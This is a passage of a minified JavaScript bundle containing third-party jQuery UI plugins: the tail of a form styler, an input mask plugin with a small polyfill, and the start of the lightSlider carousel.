                                    }), f.is(":hidden") ? (O("div.jq-selectbox__dropdown:visible").hide(), f.show(), d.addClass("opened focused"), H.onSelectOpened.call(d)) : (f.hide(), d.removeClass("opened dropup dropdown"), O("div.jq-selectbox").filter(".opened").length && H.onSelectClosed.call(d)), g.length && (g.val("").keyup(), m.hide(), g.keyup(function() {
                                        var e = O(this).val();
                                        v.each(function() {
                                            O(this).html().match(new RegExp(".*?" + e + ".*?", "i")) ? O(this).show() : O(this).hide()
                                        }), "" === M.first().text() && "" !== q.data("placeholder") && v.first().hide(), v.filter(":visible").length < 1 ? m.show() : m.hide()
                                    })), v.filter(".selected").length && ("" === q.val() ? h.scrollTop(0) : (h.innerHeight() / i % 2 != 0 && (i /= 2), h.scrollTop(h.scrollTop() + v.filter(".selected").position().top - h.innerHeight() / 2 + i))), j(h)
                                }
                            }), v.hover(function() {
                                O(this).siblings().removeClass("selected")
                            }), v.filter(".selected").text(), v.filter(":not(.disabled):not(.optgroup)").click(function() {
                                q.focus();
                                var e = O(this),
                                    t = e.text();
                                if (!e.is(".selected")) {
                                    var i = e.index();
                                    i -= e.prevAll(".optgroup").length, e.addClass("selected sel").siblings().removeClass("selected sel"), M.prop("selected", !1).eq(i).prop("selected", !0), u.text(t), d.data("jqfs-class") && d.removeClass(d.data("jqfs-class")), d.data("jqfs-class", e.data("jqfs-class")), d.addClass(e.data("jqfs-class")), q.change()
                                }
                                f.hide(), d.removeClass("opened dropup dropdown"), H.onSelectClosed.call(d)
                            }), f.mouseout(function() {
                                O("li.sel", f).addClass("selected")
                            }), q.on("change.styler", function() {
                                u.text(M.filter(":selected").text()).removeClass("placeholder"), v.removeClass("selected sel").not(".optgroup").eq(q[0].selectedIndex).addClass("selected sel"), M.first().text() != v.filter(".selected").text() ? d.addClass("changed") : d.removeClass("changed")
                            }).on("focus.styler", function() {
                                d.addClass("focused"), O("div.jqselect").not(".focused").removeClass("opened dropup dropdown").find("div.jq-selectbox__dropdown").hide()
                            }).on("blur.styler", function() {
                                d.removeClass("focused")
                            }).on("keydown.styler keyup.styler", function(e) {
                                var t = v.data("li-height");
                                "" === q.val() ? u.text(i).addClass("placeholder") : u.text(M.filter(":selected").text()), v.removeClass("selected sel").not(".optgroup").eq(q[0].selectedIndex).addClass("selected sel"), 38 != e.which && 37 != e.which && 33 != e.which && 36 != e.which || ("" === q.val() ? h.scrollTop(0) : h.scrollTop(h.scrollTop() + v.filter(".selected").position().top)), 40 != e.which && 39 != e.which && 34 != e.which && 35 != e.which || h.scrollTop(h.scrollTop() + v.filter(".selected").position().top - h.innerHeight() + t), 13 == e.which && (e.preventDefault(), f.hide(), d.removeClass("opened dropup dropdown"), H.onSelectClosed.call(d))
                            }).on("keydown.styler", function(e) {
                                32 == e.which && (e.preventDefault(), a.click())
                            }), L.registered || (O(document).on("click", L), L.registered = !0)
                        }()
                    };
                    s(), q.on("refresh", function() {
                        q.off(".styler").parent().before(q).remove(), s()
                    })
                } else q.is(":reset") && q.on("click", function() {
                    setTimeout(function() {
                        q.closest("form").find("input, select").trigger("refresh")
                    }, 1)
                })
            },
            destroy: function() {
                var e = O(this.element);
                e.is(":checkbox") || e.is(":radio") ? (e.removeData("_" + s).off(".styler refresh").removeAttr("style").parent().before(e).remove(), e.closest("label").add('label[for="' + e.attr("id") + '"]').off(".styler")) : e.is('input[type="number"]') ? e.removeData("_" + s).off(".styler refresh").closest(".jq-number").before(e).remove() : (e.is(":file") || e.is("select")) && e.removeData("_" + s).off(".styler refresh").removeAttr("style").parent().before(e).remove()
            }
        }, O.fn[s] = function(t) {
            var i, n = arguments;
            return void 0 === t || "object" == (void 0 === t ? "undefined" : r(t)) ? (this.each(function() {
                O.data(this, "_" + s) || O.data(this, "_" + s, new o(this, t))
            }).promise().done(function() {
                var e = O(this[0]).data("_" + s);
                e && e.options.onFormStyled.call()
            }), this) : "string" == typeof t && "_" !== t[0] && "init" !== t ? (this.each(function() {
                var e = O.data(this, "_" + s);
                e instanceof o && "function" == typeof e[t] && (i = e[t].apply(e, Array.prototype.slice.call(n, 1)))
            }), void 0 !== i ? i : this) : void 0
        }, L.registered = !1
    }) ? n.apply(t, o) : n) || (e.exports = s)
}, function(o, a, l) {
    "use strict";
    (function(t) {
        var e, i, n, s = "function" == typeof Symbol && "symbol" == typeof Symbol.iterator ? function(e) {
                return typeof e
            } : function(e) {
                return e && "function" == typeof Symbol && e.constructor === Symbol && e !== Symbol.prototype ? "symbol" : typeof e
            },
            r = {
                scope: {},
                findInternal: function(e, t, i) {
                    e instanceof String && (e = String(e));
                    for (var n = e.length, o = 0; o < n; o++) {
                        var s = e[o];
                        if (t.call(i, s, o, e)) return {
                            i: o,
                            v: s
                        }
                    }
                    return {
                        i: -1,
                        v: void 0
                    }
                }
            };
        r.defineProperty = "function" == typeof Object.defineProperties ? Object.defineProperty : function(e, t, i) {
            if (i.get || i.set) throw new TypeError("ES3 does not support getters and setters.");
            e != Array.prototype && e != Object.prototype && (e[t] = i.value)
        }, r.getGlobal = function(e) {
            return "undefined" != typeof window && window === e ? e : void 0 !== t && null != t ? t : e
        }, r.global = r.getGlobal(void 0), r.polyfill = function(e, t, i, n) {
            if (t) {
                for (i = r.global, e = e.split("."), n = 0; n < e.length - 1; n++) {
                    var o = e[n];
                    o in i || (i[o] = {}), i = i[o]
                }(t = t(n = i[e = e[e.length - 1]])) != n && null != t && r.defineProperty(i, e, {
                    configurable: !0,
                    writable: !0,
                    value: t
                })
            }
        }, r.polyfill("Array.prototype.find", function(e) {
            return e || function(e, t) {
                return r.findInternal(this, e, t).v
            }
        }, "es6-impl", "es3"), window.jQuery, window.Zepto, i = [l(0)], void 0 === (n = "function" == typeof(e = function(r) {
            var a = function(d, b, w) {
                var x = {
                    invalid: [],
                    getCaret: function() {
                        try {
                            var e, t = 0,
                                i = d.get(0),
                                n = document.selection,
                                o = i.selectionStart;
                            return n && -1 === navigator.appVersion.indexOf("MSIE 10") ? ((e = n.createRange()).moveStart("character", -x.val().length), t = e.text.length) : (o || "0" === o) && (t = o), t
                        } catch (e) {}
                    },
                    setCaret: function(e) {
                        try {
                            if (d.is(":focus")) {
                                var t, i = d.get(0);
                                i.setSelectionRange ? i.setSelectionRange(e, e) : ((t = i.createTextRange()).collapse(!0), t.moveEnd("character", e), t.moveStart("character", e), t.select())
                            }
                        } catch (e) {}
                    },
                    events: function() {
                        d.on("keydown.mask", function(e) {
                            d.data("mask-keycode", e.keyCode || e.which), d.data("mask-previus-value", d.val()), d.data("mask-previus-caret-pos", x.getCaret()), x.maskDigitPosMapOld = x.maskDigitPosMap
                        }).on(r.jMaskGlobals.useInput ? "input.mask" : "keyup.mask", x.behaviour).on("paste.mask drop.mask", function() {
                            setTimeout(function() {
                                d.keydown().keyup()
                            }, 100)
                        }).on("change.mask", function() {
                            d.data("changed", !0)
                        }).on("blur.mask", function() {
                            s === x.val() || d.data("changed") || d.trigger("change"), d.data("changed", !1)
                        }).on("blur.mask", function() {
                            s = x.val()
                        }).on("focus.mask", function(e) {
                            !0 === w.selectOnFocus && r(e.target).select()
                        }).on("focusout.mask", function() {
                            w.clearIfNotMatch && !n.test(x.val()) && x.val("")
                        })
                    },
                    getRegexMask: function() {
                        for (var e, t, i, n, o = [], s = 0; s < b.length; s++)(e = k.translation[b.charAt(s)]) ? (t = e.pattern.toString().replace(/.{1}$|^.{1}/g, ""), i = e.optional, (e = e.recursive) ? (o.push(b.charAt(s)), n = {
                            digit: b.charAt(s),
                            pattern: t
                        }) : o.push(i || e ? t + "?" : t)) : o.push(b.charAt(s).replace(/[-\/\\^$*+?.()|[\]{}]/g, "\\$&"));
                        return o = o.join(""), n && (o = o.replace(new RegExp("(" + n.digit + "(.*" + n.digit + ")?)"), "($1)?").replace(new RegExp(n.digit, "g"), n.pattern)), new RegExp(o)
                    },
                    destroyEvents: function() {
                        d.off("input keydown keyup paste drop blur focusout ".split(" ").join(".mask "))
                    },
                    val: function(e) {
                        var t = d.is("input") ? "val" : "text";
                        return t = 0 < arguments.length ? (d[t]() !== e && d[t](e), d) : d[t]()
                    },
                    calculateCaretPosition: function() {
                        var e = d.data("mask-previus-value") || "",
                            t = x.getMasked(),
                            i = x.getCaret();
                        if (e !== t) {
                            var n, o = d.data("mask-previus-caret-pos") || 0,
                                s = (t = t.length, e.length),
                                r = e = 0,
                                a = 0,
                                l = 0;
                            for (n = i; n < t && x.maskDigitPosMap[n]; n++) r++;
                            for (n = i - 1; 0 <= n && x.maskDigitPosMap[n]; n--) e++;
                            for (n = i - 1; 0 <= n; n--) x.maskDigitPosMap[n] && a++;
                            for (n = o - 1; 0 <= n; n--) x.maskDigitPosMapOld[n] && l++;
                            s < i ? i = 10 * t : i <= o && o !== s ? x.maskDigitPosMapOld[i] || (i = (o = i) - (l - a) - e, x.maskDigitPosMap[i] && (i = o)) : o < i && (i = i + (a - l) + r)
                        }
                        return i
                    },
                    behaviour: function(e) {
                        e = e || window.event, x.invalid = [];
                        var t = d.data("mask-keycode");
                        if (-1 === r.inArray(t, k.byPassKeys)) {
                            t = x.getMasked();
                            var i = x.getCaret();
                            return setTimeout(function() {
                                x.setCaret(x.calculateCaretPosition())
                            }, r.jMaskGlobals.keyStrokeCompensation), x.val(t), x.setCaret(i), x.callbacks(e)
                        }
                    },
                    getMasked: function(e, t) {
                        var i, n, o, s = [],
                            r = void 0 === t ? x.val() : t + "",
                            a = 0,
                            l = b.length,
                            d = 0,
                            c = r.length,
                            u = 1,
                            p = "push",
                            f = -1,
                            h = 0,
                            v = [];
                        for (n = w.reverse ? (p = "unshift", u = -1, i = 0, a = l - 1, d = c - 1, function() {
                                return -1 < a && -1 < d
                            }) : (i = l - 1, function() {
                                return a < l && d < c
                            }); n();) {
                            var g = b.charAt(a),
                                m = r.charAt(d),
                                y = k.translation[g];
                            y ? (m.match(y.pattern) ? (s[p](m), y.recursive && (-1 === f ? f = a : a === i && a !== f && (a = f - u), i === f && (a -= u)), a += u) : m === o ? (h--, o = void 0) : y.optional ? (a += u, d -= u) : y.fallback ? (s[p](y.fallback), a += u, d -= u) : x.invalid.push({
                                p: d,
                                v: m,
                                e: y.pattern
                            }), d += u) : (e || s[p](g), m === g ? (v.push(d), d += u) : (o = g, v.push(d + h), h++), a += u)
                        }
                        return r = b.charAt(i), l !== c + 1 || k.translation[r] || s.push(r), s = s.join(""), x.mapMaskdigitPositions(s, v, c), s
                    },
                    mapMaskdigitPositions: function(e, t, i) {
                        for (e = w.reverse ? e.length - i : 0, x.maskDigitPosMap = {}, i = 0; i < t.length; i++) x.maskDigitPosMap[t[i] + e] = 1
                    },
                    callbacks: function(e) {
                        var t = x.val(),
                            i = t !== s,
                            n = [t, e, d, w],
                            o = function(e, t, i) {
                                "function" == typeof w[e] && t && w[e].apply(this, i)
                            };
                        o("onChange", !0 === i, n), o("onKeyPress", !0 === i, n), o("onComplete", t.length === b.length, n), o("onInvalid", 0 < x.invalid.length, [t, e, d, x.invalid, w])
                    }
                };
                d = r(d);
                var n, k = this,
                    s = x.val();
                b = "function" == typeof b ? b(x.val(), void 0, d, w) : b, k.mask = b, k.options = w, k.remove = function() {
                    var e = x.getCaret();
                    return k.options.placeholder && d.removeAttr("placeholder"), d.data("mask-maxlength") && d.removeAttr("maxlength"), x.destroyEvents(), x.val(k.getCleanVal()), x.setCaret(e), d
                }, k.getCleanVal = function() {
                    return x.getMasked(!0)
                }, k.getMaskedVal = function(e) {
                    return x.getMasked(!1, e)
                }, k.init = function(e) {
                    if (e = e || !1, w = w || {}, k.clearIfNotMatch = r.jMaskGlobals.clearIfNotMatch, k.byPassKeys = r.jMaskGlobals.byPassKeys, k.translation = r.extend({}, r.jMaskGlobals.translation, w.translation), k = r.extend(!0, {}, k, w), n = x.getRegexMask(), e) x.events(), x.val(x.getMasked());
                    else {
                        w.placeholder && d.attr("placeholder", w.placeholder), d.data("mask") && d.attr("autocomplete", "off");
                        for (var t = !(e = 0); e < b.length; e++) {
                            var i = k.translation[b.charAt(e)];
                            if (i && i.recursive) {
                                t = !1;
                                break
                            }
                        }
                        t && d.attr("maxlength", b.length).data("mask-maxlength", !0), x.destroyEvents(), x.events(), e = x.getCaret(), x.val(x.getMasked()), x.setCaret(e)
                    }
                }, k.init(!d.is("input"))
            };
            r.maskWatchers = {};
            var t = function() {
                    var e = r(this),
                        t = {},
                        i = e.attr("data-mask");
                    if (e.attr("data-mask-reverse") && (t.reverse = !0), e.attr("data-mask-clearifnotmatch") && (t.clearIfNotMatch = !0), "true" === e.attr("data-mask-selectonfocus") && (t.selectOnFocus = !0), l(e, i, t)) return e.data("mask", new a(this, i, t))
                },
                l = function(e, t, i) {
                    i = i || {};
                    var n = r(e).data("mask"),
                        o = JSON.stringify;
                    e = r(e).val() || r(e).text();
                    try {
                        return "function" == typeof t && (t = t(e)), "object" !== (void 0 === n ? "undefined" : s(n)) || o(n.options) !== o(i) || n.mask !== t
                    } catch (e) {}
                },
                e = function(e) {
                    var t, i = document.createElement("div");
                    return (t = (e = "on" + e) in i) || (i.setAttribute(e, "return;"), t = "function" == typeof i[e]), t
                };
            r.fn.mask = function(e, t) {
                t = t || {};
                var i = this.selector,
                    n = (o = r.jMaskGlobals).watchInterval,
                    o = t.watchInputs || o.watchInputs,
                    s = function() {
                        if (l(this, e, t)) return r(this).data("mask", new a(this, e, t))
                    };
                return r(this).each(s), i && "" !== i && o && (clearInterval(r.maskWatchers[i]), r.maskWatchers[i] = setInterval(function() {
                    r(document).find(i).each(s)
                }, n)), this
            }, r.fn.masked = function(e) {
                return this.data("mask").getMaskedVal(e)
            }, r.fn.unmask = function() {
                return clearInterval(r.maskWatchers[this.selector]), delete r.maskWatchers[this.selector], this.each(function() {
                    var e = r(this).data("mask");
                    e && e.remove().removeData("mask")
                })
            }, r.fn.cleanVal = function() {
                return this.data("mask").getCleanVal()
            }, r.applyDataMask = function(e) {
                ((e = e || r.jMaskGlobals.maskElements) instanceof r ? e : r(e)).filter(r.jMaskGlobals.dataMaskAttr).each(t)
            }, e = {
                maskElements: "input,td,span,div",
                dataMaskAttr: "*[data-mask]",
                dataMask: !0,
                watchInterval: 300,
                watchInputs: !0,
                keyStrokeCompensation: 10,
                useInput: !/Chrome\/[2-4][0-9]|SamsungBrowser/.test(window.navigator.userAgent) && e("input"),
                watchDataMask: !1,
                byPassKeys: [9, 16, 17, 18, 36, 37, 38, 39, 40, 91],
                translation: {
                    0: {
                        pattern: /\d/
                    },
                    9: {
                        pattern: /\d/,
                        optional: !0
                    },
                    "#": {
                        pattern: /\d/,
                        recursive: !0
                    },
                    A: {
                        pattern: /[a-zA-Z0-9]/
                    },
                    S: {
                        pattern: /[a-zA-Z]/
                    }
                }
            }, r.jMaskGlobals = r.jMaskGlobals || {}, (e = r.jMaskGlobals = r.extend(!0, {}, e, r.jMaskGlobals)).dataMask && r.applyDataMask(), setInterval(function() {
                r.jMaskGlobals.watchDataMask && r.applyDataMask()
            }, e.watchInterval)
        }) ? e.apply(a, i) : e) || (o.exports = n)
    }).call(this, l(6))
}, function(e, t) {
    var i;
    i = function() {
        return this
    }();
    try {
        i = i || new Function("return this")()
    } catch (e) {
        "object" == typeof window && (i = window)
    }
    e.exports = i
}, function(e, t, i) {
    "use strict";
    var T, n;
    T = jQuery, n = {
        item: 3,
        autoWidth: !1,
        slideMove: 1,
        slideMargin: 10,
        addClass: "",
        mode: "slide",
        useCSS: !0,
        cssEasing: "ease",
        easing: "linear",
        speed: 400,
        auto: !1,
        pauseOnHover: !1,
        loop: !1,
        slideEndAnimation: !0,
        pause: 2e3,
        keyPress: !1,
        controls: !0,
        prevHtml: "",
        nextHtml: "",
        rtl: !1,
        adaptiveHeight: !1,
        vertical: !1,
        verticalHeight: 500,
        vThumbWidth: 100,
        thumbItem: 10,
        pager: !0,
        gallery: !1,
        galleryMargin: 5,
        thumbMargin: 5,
        currentPagerPosition: "middle",
        enableTouch: !0,
        enableDrag: !0,
        freeMove: !0,
        swipeThreshold: 40,
        responsive: [],
        onBeforeStart: function(e) {},
        onSliderLoad: function(e) {},
        onBeforeSlide: function(e, t) {},
        onAfterSlide: function(e, t) {},
        onBeforeNextSlide: function(e, t) {},
        onBeforePrevSlide: function(e, t) {}
    }, T.fn.lightSlider = function(e) {
        if (0 === this.length) return this;
        if (1 < this.length) return this.each(function() {
            T(this).lightSlider(e)
        }), this;
        var i = {},
            c = T.extend(!0, {}, n, e),
            o = {},
            u = this;
        i.$el = this, "fade" === c.mode && (c.vertical = !1);
        var d = u.children(),
            s = T(window).width(),
            r = null,
            a = 0,
            p = 0,
            t = !1,
            f = 0,
            h = "",
            v = 0,
            g = !0 === c.vertical ? "height" : "width",
            m = !0 === c.vertical ? "margin-bottom" : "margin-right",
            y = 0,
            b = 0,
            w = 0,
            x = 0,
            l = null,
            k = "ontouchstart" in document.documentElement,
            S = {
                chbreakpoint: function() {
                    if (s = T(window).width(), c.responsive.length) {
                        var e;
                        if (!1 === c.autoWidth && (e = c.item), s < c.responsive[0].breakpoint)
                            for (var t = 0; t < c.responsive.length; t++) s < c.responsive[t].breakpoint && (c.responsive[t].breakpoint, r = c.responsive[t]);
                        if (null != r)
                            for (var i in r.settings) r.settings.hasOwnProperty(i) && ((void 0 === o[i] || null === o[i]) && (o[i] = c[i]), c[i] = r.settings[i]);
                        if (!T.isEmptyObject(o) && s > c.responsive[0].breakpoint)
                            for (var n in o) o.hasOwnProperty(n) && (c[n] = o[n]);
                        !1 === c.autoWidth && 0 < y && 0 < w && e !== c.item && (v = Math.round(y / ((w + c.slideMargin) * c.slideMove)))
                    }
                },
                calSW: function() {
                    !1 === c.autoWidth && (w = (f - (c.item * c.slideMargin - c.slideMargin)) / c.item)
                },
                calWidth: function(e) {
                    var t = !0 === e ? h.find(".lslide").length : d.length;
                    if (!1 === c.autoWidth) p = t * (w + c.slideMargin);
                    else
                        for (var i = p = 0; i < t; i++) p += parseInt(d.eq(i).width()) + c.slideMargin;
                    return p
                }
            };
        return (i = {
            doCss: function() {
                return !(!c.useCSS || ! function() {
                    for (var e = ["transition", "MozTransition", "WebkitTransition", "OTransition", "msTransition", "KhtmlTransition"], t = document.documentElement, i = 0; i < e.length; i++)
                        if (e[i] in t.style) return !0
                }())
            },
            keyPress: function() {
                c.keyPress && T(document).on("keyup.lightslider", function(e) {
                    T(":focus").is("input, textarea") || (e.preventDefault ? e.preventDefault() : e.returnValue = !1, 37 === e.keyCode ? u.goToPrevSlide() : 39 === e.keyCode && u.goToNextSlide())
                })
            },
            controls: function() {
                c.controls && (u.after('<div class="lSAction"><a class="lSPrev">' + c.prevHtml + '</a><a class="lSNext">' + c.nextHtml + "</a></div>"), c.autoWidth ? S.calWidth(!1) < f && h.find(".lSAction").hide() : a <= c.item && h.find(".lSAction").hide(), h.find(".lSAction a").on("click", function(e) {
                    return e.preventDefault ? e.preventDefault() : e.returnValue = !1, "lSPrev" === T(this).attr("class") ? u.goToPrevSlide() : u.goToNextSlide(), !1
                }))
            },
            initialStyle: function() {
                var l = this;
                "fade" === c.mode && (c.autoWidth = !1, c.slideEndAnimation = !1), c.auto && (c.slideEndAnimation = !1), c.autoWidth && (c.slideMove = 1, c.item = 1), c.loop && (c.slideMove = 1, c.freeMove = !1), c.onBeforeStart.call(this, u), S.chbreakpoint(), u.addClass("lightSlider").wrap('<div class="lSSlideOuter ' + c.addClass + '"><div class="lSSlideWrapper"></div></div>'), h = u.parent(".lSSlideWrapper"), !0 === c.rtl && h.parent().addClass("lSrtl"), c.vertical ? (h.parent().addClass("vertical"), f = c.verticalHeight, h.css("height", f + "px")) : f = u.outerWidth(), d.addClass("lslide"), !0 === c.loop && "slide" === c.mode && (S.calSW(), S.clone = function() {
                    if (S.calWidth(!0) > f) {
                        for (var e = 0, t = 0, i = 0; i < d.length && (t++, !((e += parseInt(u.find(".lslide").eq(i).width()) + c.slideMargin) >= f + c.slideMargin)); i++);
                        var n = !0 === c.autoWidth ? t : c.item;
                        if (n < u.find(".clone.left").length)
                            for (var o = 0; o < u.find(".clone.left").length - n; o++) d.eq(o).remove();
                        if (n < u.find(".clone.right").length)
                            for (var s = d.length - 1; s > d.length - 1 - u.find(".clone.right").length; s--) v--, d.eq(s).remove();
                        for (var r = u.find(".clone.right").length; r < n; r++) u.find(".lslide").eq(r).clone().removeClass("lslide").addClass("clone right").appendTo(u), v++;
                        for (var a = u.find(".lslide").length - u.find(".clone.left").length; a > u.find(".lslide").length - n; a--) u.find(".lslide").eq(a - 1).clone().removeClass("lslide").addClass("clone left").prependTo(u);
                        d = u.children()
                    } else d.hasClass("clone") && (u.find(".clone").remove(), l.move(u, 0))
                }, S.clone()), S.sSW = function() {
                    a = d.length, !0 === c.rtl && !1 === c.vertical && (m = "margin-left"), !1 === c.autoWidth && d.css(g, w + "px"), d.css(m, c.slideMargin + "px"), p = S.calWidth(!1), u.css(g, p + "px"), !0 === c.loop && "slide" === c.mode && !1 === t && (v = u.find(".clone.left").length)
                }, S.calL = function() {
                    d = u.children(), a = d.length
                }, this.doCss() && h.addClass("usingCss"), S.calL(), "slide" === c.mode ? (S.calSW(), S.sSW(), !0 === c.loop && (y = l.slideValue(), this.move(u, y)), !1 === c.vertical && this.setHeight(u, !1)) : (this.setHeight(u, !0), u.addClass("lSFade"), this.doCss() || (d.fadeOut(0), d.eq(v).fadeIn(0))), !0 === c.loop && "slide" === c.mode ? d.eq(v).addClass("active") : d.first().addClass("active")
            },
            pager: function() {
                var d = this;
                if (S.createPager = function() {
                        x = (f - (c.thumbItem * c.thumbMargin - c.thumbMargin)) / c.thumbItem;
                        var e = h.find(".lslide"),
                            t = h.find(".lslide").length,
                            i = 0,
                            n = "",
                            o = 0;
                        for (i = 0; i < t; i++) {
                            "slide" === c.mode && (c.autoWidth ? o += (parseInt(e.eq(i).width()) + c.slideMargin) * c.slideMove : o = i * (w + c.slideMargin) * c.slideMove);
                            var s = e.eq(i * c.slideMove).attr("data-thumb");
                            if (n += !0 === c.gallery ? '<li style="width:100%;' + g + ":" + x + "px;" + m + ":" + c.thumbMargin + 'px"><a href="#"><img src="' + s + '" /></a></li>' : '<li><a href="#">' + (i + 1) + "</a></li>", "slide" === c.mode && o >= p - f - c.slideMargin) {
                                i += 1;
                                var r = 2;
                                c.autoWidth && (n += '<li><a href="#">' + (i + 1) + "</a></li>", r = 1), i < r ? (n = null, h.parent().addClass("noPager")) : h.parent().removeClass("noPager");
                                break
                            }
                        }
                        var a = h.parent();
                        a.find(".lSPager").html(n), !0 === c.gallery && (!0 === c.vertical && a.find(".lSPager").css("width", c.vThumbWidth + "px"), b = i * (c.thumbMargin + x) + .5, a.find(".lSPager").css({
                            property: b + "px",
                            "transition-duration": c.speed + "ms"
                        }), !0 === c.vertical && h.parent().css("padding-right", c.vThumbWidth + c.galleryMargin + "px"), a.find(".lSPager").css(g, b + "px"));
                        var l = a.find(".lSPager").find("li");
                        l.first().addClass("active"), l.on("click", function() {
                            return !0 === c.loop && "slide" === c.mode ? v += l.index(this) - a.find(".lSPager").find("li.active").index() : v = l.index(this), u.mode(!1), !0 === c.gallery && d.slideThumb(), !1
                        })
                    }, c.pager) {
                    var e = "lSpg";
                    c.gallery && (e = "lSGallery"), h.after('<ul class="lSPager ' + e + '"></ul>');
                    var t = c.vertical ? "margin-left" : "margin-top";
                    h.parent().find(".lSPager").css(t, c.galleryMargin + "px"), S.createPager()
                }
                setTimeout(function() {
                    S.init()
                }, 0)
            },
            setHeight: function(n, o) {
                var s = null,
                    e = this;
                s = c.loop ? n.children(".lslide ").first() : n.children().first();
                var t = function() {
                    var e = s.outerHeight(),
                        t = 0,
                        i = e;
                    o && (e = 0, t = 100 * i / f), n.css({
                        height: e + "px",
                        "padding-bottom": t + "%"
                    })
                };
                t(), s.find("img").length ? s.find("img")[0].complete ? (t(), l || e.auto()) : s.find("img").on("load", function() {
                    setTimeout(function() {
                        t(), l || e.auto()
                    }, 100)
                }) : l || e.auto()
            },
            active: function(e, t) {
                this.doCss() && "fade" === c.mode && h.addClass("on");
                var i, n, o = 0;
                v * c.slideMove < a ? (e.removeClass("active"), this.doCss() || "fade" !== c.mode || !1 !== t || e.fadeOut(c.speed), o = !0 === t ? v : v * c.slideMove, !0 === t && (n = (i = e.length) - 1, i <= o + 1 && (o = n)), !0 === c.loop && "slide" === c.mode && (o = !0 === t ? v - u.find(".clone.left").length : v * c.slideMove, !0 === t && (n = (i = e.length) - 1, o + 1 === i ? o = n : i < o + 1 && (o = 0))), this.doCss() || "fade" !== c.mode || !1 !== t || e.eq(o).fadeIn(c.speed), e.eq(o).addClass("active")) : (e.removeClass("active"), e.eq(e.length - 1).addClass("active"), this.doCss() || "fade" !== c.mode || !1 !== t || (e.fadeOut(c.speed), e.eq(o).fadeIn(c.speed)))
            },
            move: function(e, t) {
                !0 === c.rtl && (t = -t), this.doCss() ? e.css(!0 === c.vertical ? {
                    transform: "translate3d(0px, " + -t + "px, 0px)",
                    "-webkit-transform": "translate3d(0px, " + -t + "px, 0px)"
                } : {
                    transform: "translate3d(" + -t + "px, 0px, 0px)",
                    "-webkit-transform": "translate3d(" + -t + "px, 0px, 0px)"
                }) : !0 === c.vertical ? e.css("position", "relative").animate({
                    top: -t + "px"
                }, c.speed, c.easing) : e.css("position", "relative").animate({
                    left: -t + "px"
                }, c.speed, c.easing);
                var i = h.parent().find(".lSPager").find("li");
                this.active(i, !0)
            },
            fade: function() {
                this.active(d, !1);
                var e = h.parent().find(".lSPager").find("li");
                this.active(e, !0)
            },
            slide: function() {
                var e = this;
                S.calSlide = function() {
                    f < p && (y = e.slideValue(), e.active(d, !1), y > p - f - c.slideMargin ? y = p - f - c.slideMargin : y < 0 && (y = 0), e.move(u, y), !0 === c.loop && "slide" === c.mode && (v >= a - u.find(".clone.left").length / c.slideMove && e.resetSlide(u.find(".clone.left").length), 0 === v && e.resetSlide(h.find(".lslide").length)))
                }, S.calSlide()
            },
            resetSlide: function(e) {
                var t = this;
                h.find(".lSAction a").addClass("disabled"), setTimeout(function() {
                    v = e, h.css("transition-duration", "0ms"), y = t.slideValue(), t.active(d, !1), i.move(u, y), setTimeout(function() {
                        h.css("transition-duration", c.speed + "ms"), h.find(".lSAction a").removeClass("disabled")
                    }, 50)
                }, c.speed + 100)
            },
            slideValue: function() {
                var e = 0;
                if (!1 === c.autoWidth) e = v * (w + c.slideMargin) * c.slideMove;
                else
                    for (var t = e = 0; t < v; t++) e += parseInt(d.eq(t).width()) + c.slideMargin;
                return e
            },
            slideThumb: function() {
                var e;
                switch (c.currentPagerPosition) {
                    case "left":
                        e = 0;
                        break;
                    case "middle":
                        e = f / 2 - x / 2;
                        break;
                    case "right":
                        e = f - x
                }
                var t = v - u.find(".clone.left").length,
                    i = h.parent().find(".lSPager");
                "slide" === c.mode && !0 === c.loop && (t >= i.children().length ? t = 0 : t < 0 && (t = i.children().length));
                var n = t * (x + c.thumbMargin) - e;
                b < n + f && (n = b - f - c.thumbMargin), n < 0 && (n = 0), this.move(i, n)
            },
            auto: function() {
                c.auto && (clearInterval(l), l = setInterval(function() {
                    u.goToNextSlide()
                }, c.pause))
            },
            pauseOnHover: function() {
                var e = this;
                c.auto && c.pauseOnHover && (h.on("mouseenter", function() {
                    T(this).addClass("ls-hover"), u.pause(), c.auto = !0
                }), h.on("mouseleave", function() {
                    T(this).removeClass("ls-hover"), h.find(".lightSlider").hasClass("lsGrabbing") || e.auto()
                }))
            },
            touchMove: function(e, t) {
                if (h.css("transition-duration", "0ms"), "slide" === c.mode) {
                    var i = y - (e - t);
                    if (i >= p - f - c.slideMargin)
                        if (!1 === c.freeMove) i = p - f - c.slideMargin;
                        else {
                            var n = p - f - c.slideMargin;
                            i = n + (i - n) / 5
                        } else i < 0 && (!1 === c.freeMove ? i = 0 : i /= 5);
                    this.move(u, i)
                }
            },
            touchEnd: function(e) {
                if (h.css("transition-duration", c.speed + "ms"), "slide" === c.mode) {
                    var s = !1,
                        t = !0;
                    (y -= e) > p - f - c.slideMargin ? (y = p - f - c.slideMargin, !1 === c.autoWidth && (s = !0)) : y < 0 && (y = 0);
                    var i = function(e) {
                        var t = 0;
                        if (s || e && (t = 1), c.autoWidth)
                            for (var i = 0, n = 0; n < d.length && (i += parseInt(d.eq(n).width()) + c.slideMargin, v = n + t, !(y <= i)); n++);
                        else {
                            var o = y / ((w + c.slideMargin) * c.slideMove);
                            v = parseInt(o) + t, y >= p - f - c.slideMargin && o % 1 != 0 && v++
                        }
                    };
                    e >= c.swipeThreshold ? (i(!1), t = !1) : e <= -c.swipeThreshold && (i(!0), t = !1), u.mode(t), this.slideThumb()
                } else e >= c.swipeThreshold ? u.goToPrevSlide() : e <= -c.swipeThreshold && u.goToNextSlide()
            },
            enableDrag: function() {
                var i = this;
                if (!k) {
                    var n = 0,
                        o = 0,
                        s = !1;
                    h.find(".lightSlider").addClass("lsGrab"), h.on("mousedown", function(e) {
                        return !(p < f && 0 !== p) && void("lSPrev" !== T(e.target).attr("class") && "lSNext" !== T(e.target).attr("class") && (n = !0 === c.vertical ? e.pageY : e.pageX, s = !0, e.preventDefault ? e.preventDefault() : e.returnValue = !1, h.scrollLeft += 1, h.scrollLeft -= 1, h.find(".lightSlider").removeClass("lsGrab").addClass("lsGrabbing"), clearInterval(l)))
                    }), T(window).on("mousemove", function(e) {
                        s && (o = !0 === c.vertical ? e.pageY : e.pageX, i.touchMove(o, n))
                    }), T(window).on("mouseup", function(e) {
                        if (s) {
                            h.find(".lightSlider").removeClass("lsGrabbing").addClass("lsGrab");
                            var t = (o = !(s = !1) === c.vertical ? e.pageY : e.pageX) - n;
                            Math.abs(t) >= c.swipeThreshold && T(window).on("click.ls", function(e) {
